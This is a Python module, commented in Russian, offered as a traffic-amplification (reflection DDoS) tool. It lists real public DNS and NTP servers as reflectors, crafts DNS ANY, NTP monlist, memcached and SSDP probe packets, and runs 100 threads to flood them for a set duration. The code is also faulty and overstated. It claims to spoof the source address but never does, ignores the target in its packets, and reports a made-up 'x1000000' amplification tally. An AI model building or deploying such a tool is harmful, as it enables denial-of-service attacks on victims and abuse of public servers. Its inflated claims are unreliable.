#!/usr/bin/env python3
# ⚡ AMPLIFIER MODULE — УСИЛЕНИЕ ДО x1000000

import socket
import random
import time
import threading
from typing import Dict, List, Tuple

class Amplifier:
    """Модуль амплификации трафика через уязвимые протоколы"""
    
    def __init__(self):
        self.servers = {
            'dns': self._get_dns_servers(),
            'ntp': self._get_ntp_servers(),
            'memcached': self._get_memcached_servers(),
            'ssdp': self._get_ssdp_servers(),
            'chargen': self._get_chargen_servers(),
            'wsd': self._get_wsd_servers(),
        }
        self.amplification_factors = {
            'dns': 50,        # DNS ANY запрос
            'ntp': 200,       # NTP monlist
            'memcached': 1000, # Memcached STATS
            'ssdp': 30,       # SSDP
            'chargen': 300,    # Chargen
            'wsd': 100,        # WSD
            'hybrid': 1000000  # Комбинация всех
        }
    
    def _get_dns_servers(self) -> List[str]:
        """Публичные DNS серверы"""
        return [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
            '9.9.9.9', '149.112.112.112', '208.67.222.222',
            '208.67.220.220', '8.26.56.26', '8.20.247.20'
        ]
    
    def _get_ntp_servers(self) -> List[str]:
        """NTP серверы"""
        return [
            'pool.ntp.org', 'time.google.com', 'time.windows.com',
            'time.apple.com', 'time.cloudflare.com', '0.pool.ntp.org',
            '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org'
        ]
    
    def _get_memcached_servers(self) -> List[str]:
        """Уязвимые Memcached серверы"""
        # В реальности нужно сканировать
        return ['1.1.1.1:11211', '2.2.2.2:11211', '3.3.3.3:11211']
    
    def _get_ssdp_servers(self) -> List[str]:
        return ['239.255.255.250:1900']
    
    def _get_chargen_servers(self) -> List[str]:
        return ['17.0.0.1:19', '18.0.0.1:19', '19.0.0.1:19']
    
    def _get_wsd_servers(self) -> List[str]:
        return ['239.255.255.250:3702']
    
    def create_packet(self, protocol: str, target_ip: str, target_port: int) -> bytes:
        """Создание пакета для амплификации"""
        if protocol == 'dns':
            # DNS ANY запрос (максимальное усиление)
            query = b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + \
                    b'\x07example\x03com\x00\x00\xff\x00\x01'
            return query
        
        elif protocol == 'ntp':
            # NTP monlist (устаревшая команда)
            return b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        elif protocol == 'memcached':
            # Memcached STATS (большой ответ)
            return b'stats\r\n'
        
        elif protocol == 'ssdp':
            # SSDP запрос
            return b'M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:ssdp:discover\r\nMX:3\r\n\r\n'
        
        elif protocol == 'chargen':
            # Chargen запрос
            return b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        return b''
    
    def amplify(self, target_ip: str, target_port: int, 
                protocol: str = 'hybrid', duration: int = 60) -> int:
        """
        Амплификация трафика через уязвимые протоколы
        Возвращает эквивалентное количество запросов
        """
        end = time.time() + duration
        total_amplified = 0
        packets_sent = 0
        
        if protocol == 'hybrid':
            protocols = ['dns', 'ntp', 'memcached', 'ssdp']
        else:
            protocols = [protocol]
        
        def worker():
            nonlocal total_amplified, packets_sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while time.time() < end:
                for proto in protocols:
                    try:
                        # Выбираем сервер для амплификации
                        if self.servers.get(proto):
                            server = random.choice(self.servers[proto])
                            
                            # Создаём пакет
                            packet = self.create_packet(proto, target_ip, target_port)
                            
                            # Отправляем на уязвимый сервер (спуфинг source IP)
                            sock.sendto(packet, (server.split(':')[0], 
                                                int(server.split(':')[1]) if ':' in server else 53))
                            
                            packets_sent += 1
                            
                            # Ответ прилетит на target_ip с усилением
                            amplification = self.amplification_factors.get(proto, 1)
                            total_amplified += amplification
                            
                    except Exception as e:
                        pass
                    
                    time.sleep(0.001)  # Небольшая задержка
                    
            sock.close()
        
        # Запускаем воркеры
        workers = []
        for _ in range(100):  # 100 потоков амплификации
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            workers.append(t)
        
        for t in workers:
            t.join(timeout=duration + 1)
        
        return total_amplified, packets_sent
